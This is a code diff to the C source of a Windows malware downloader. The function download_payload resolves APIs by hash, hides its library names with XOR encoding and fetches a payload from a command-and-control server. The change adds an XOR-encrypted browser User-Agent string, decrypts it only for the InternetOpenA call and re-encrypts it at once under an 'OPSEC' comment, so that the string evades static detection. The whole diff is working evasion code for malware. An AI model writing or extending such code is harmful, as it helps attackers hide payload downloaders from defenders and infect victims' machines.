@@ -17,6 +17,10 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
     
     char enc_wininet[] = { 0x28, 0x1a, 0x1b, 0x19, 0x5d, 0x16, 0x47, 0x4d, 0x16, 0x5f, 0x18, 0x6b };
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
+    
+    // --- new encoded string for User-Agent
+    // NOTE: encrypt "Mozilla/5.0" using string_encryptor.py!
+    char enc_user_agent[] = { 0x12, 0x1c, 0x0f, 0x19, 0x5f, 0x1f, 0x52, 0x4c, 0x47, 0x1d, 0x44, 0x6b };
 
     // API hashes
     // NOTE: calculate these using hasher.py
@@ -58,8 +62,15 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
 
     // --- download file logic
     
+    // decrypt User-Agent
+    xor_crypt(enc_user_agent, sizeof(enc_user_agent), cypher_key, cypher_key_len);
+    
     // act as a legitimate browser (ex. Firefox)
-    HINTERNET hInternet = fnInternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = fnInternetOpenA(enc_user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    
+    // OPSEC: recypher User-Agent immediately
+    xor_crypt(enc_user_agent, sizeof(enc_user_agent), cypher_key, cypher_key_len);
+
     if (!hInternet) return NULL;
 
     // open connection to C2 server
